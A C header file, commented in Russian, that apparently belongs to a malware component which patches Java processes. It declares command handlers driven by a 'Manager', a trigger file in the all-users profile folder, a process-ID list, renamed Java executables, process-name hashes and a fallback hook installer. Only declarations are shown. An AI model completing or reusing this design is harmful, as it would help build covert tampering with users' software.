#ifndef		JAVS_PATCHERH
#define		JAVS_PATCHERH

#include "windows.h"

#include "Javaclient2015Saver.h"

const char* GetJREPath();
const char UpdatePath[] = "UpdatePatch\0";
const char DeletePath[] = "deletepatch\0";

// Имя сигнального файла. Файл должен находиться в профильной
// директории всех пользователей (WIN 7 -  c:\Users\All Users\
// как только в нужном месте появися файл с нужным именем запустится
// работа патча
const char JavaPatcherSignalFile[] = "Pat.txt";


// Имя файла куда записываются пиды процессов для которых
// необходимо поставить патч
const char JavaPatcherPidsFile[] = "wj.dat";


// Имена пропатченных ехе
const char Patched_Jawa_Name[]  = "javao.exe";
const char Patched_Jawaw_Name[] = "javawo.exe";

#define PROCESS_HASH_PATCHED_JAVA  0x9F1AA76B /* javao.exe */
#define PROCESS_HASH_PATCHED_JAVAW 0x9434FBEE /* javawo.exe */


bool ExecuteUpdatePathCommand(LPVOID Manager, PCHAR Command, PCHAR Args);
bool ExecuteDeletePathCommand(LPVOID Manager, PCHAR Command, PCHAR Args);

bool WINAPI ClearAndDel( LPVOID lpData );

DWORD WINAPI Run_Path(LPVOID lpData);
bool JavaPatchInstalled();


//-------------------------------------------------------------
// JavaPatcherSignal - Функция сигнализирует о необходимости
//                     запуска патчей
//-------------------------------------------------------------
DWORD WINAPI JavaPatcherSignal(LPVOID lpData);
//устанвливает хуки для ява патчера, только в случае если основной механизм не сработал
bool SetJavaPatcherHook();
//возвращает рабочую папку ява патчера, path должен иметь достаточное колчество памяти, если указан fileName, то имя
//этого файла добавляется к рабочей папке
char* GetJavaPatchWorkFolder( char* path, const char* fileName = 0 );

#endif		//java_patcher
